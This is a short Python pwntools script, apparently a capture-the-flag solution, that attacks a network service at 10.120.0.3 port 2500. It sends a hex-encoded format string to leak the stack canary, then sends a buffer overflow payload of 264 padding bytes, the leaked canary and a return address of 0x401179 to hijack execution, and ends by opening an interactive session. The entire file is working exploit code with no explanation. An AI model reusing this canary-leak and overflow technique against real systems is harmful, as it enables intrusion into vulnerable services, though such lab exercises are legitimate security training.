#!/usr/bin/evn python3
from pwn import *

#e = ELF('./cty')
io = remote('10.120.0.3', '2500')
#io = e.process()
#gdb.attach(io)
prompt = io.recv()
print(prompt)
#io.sendline('%39$lx'.hex())
io.sendline('253339246c78')
print('sendline')
leak = io.recv()
print(leak)
canary = int(leak.strip(),16)
log.info("Canary: %s" % (hex(canary)))


run = 0x401179
pl = b'A'*8
payload = b'A'*264 + p64(canary) + pl + p64(run)
io.sendline(payload.hex())

#print(io.recvline())
io.interactive()


